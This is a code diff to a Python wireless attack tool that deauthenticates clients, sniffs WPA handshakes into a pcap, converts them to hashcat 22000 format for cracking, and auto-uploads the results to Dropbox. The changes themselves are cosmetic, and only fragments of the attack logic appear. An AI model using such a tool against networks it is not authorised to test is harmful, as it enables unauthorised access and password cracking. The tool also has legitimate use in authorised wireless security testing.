@@ -18,11 +18,10 @@ class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
     OKGREEN = '\033[92m'
+    BGGREEN = '\033[44m'
     WARNING = '\033[93m'
     FAIL = '\033[91m'
     ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
 
 
 packet_list = []
@@ -35,8 +34,8 @@ def check_monitor(iface):
         subprocess.call('ip link set %s down' % iface, shell=True)
         subprocess.call('iw dev %s set type monitor' % iface, shell=True)
         subprocess.call('ip link set %s up' % iface, shell=True)
-        if subprocess.check_output("iw dev %s info | grep type | cut -d ' ' -f 2" % iface, shell=True).decode().strip() \
-                != "monitor":
+        if subprocess.check_output("iw dev %s info | grep type | cut -d ' ' -f 2" % iface, shell=True).decode() \
+                .strip() != "monitor":
             print('Failed to set %s monitor mode. Exiting..' % iface)
             sys.exit()
 
@@ -82,8 +81,8 @@ def check_args():
                                              'Default: sniffed_current_date.pcap', default='sniffed.pcap',
                         dest='pcap_file')
     results = parser.parse_args()
-    return results.iface, results.ap, results.client, results.channel, results.deauth_count, results.timeout, \
-           results.pcap_file
+    return results.iface, results.ap, results.client, results.channel, results.deauth_count, \
+           results.timeout, results.pcap_file
 
 
 def sniffer():
@@ -132,9 +131,7 @@ def dropbox_uploader():
                         with open(file_path, 'rb') as f:
                             dbx.files_upload(f.read(), dest_path, mode=dropbox.files.WriteMode.overwrite, mute=True)
                 except Exception as err:
-                    print("Failed to upload %s\n%s" % (file, err))
-
-    print(f"{bcolors.OKGREEN}Finished upload.{bcolors.ENDC}")
+                    print(f"{bcolors.FAIL}Failed to upload %s\n%s{bcolors.ENDC}" % (file, err))
 
 
 if __name__ == '__main__':
@@ -155,3 +152,4 @@ if __name__ == '__main__':
     print('Packets Written to: %s' % (os.getcwd() + '/' + pcap_file))
     cap_converter()  # Function that converts pcap to hashcat 22000 mode.
     dropbox_uploader()  # Automatic hash uploader
+    print(f"{bcolors.BGGREEN}Finished.{bcolors.ENDC}")
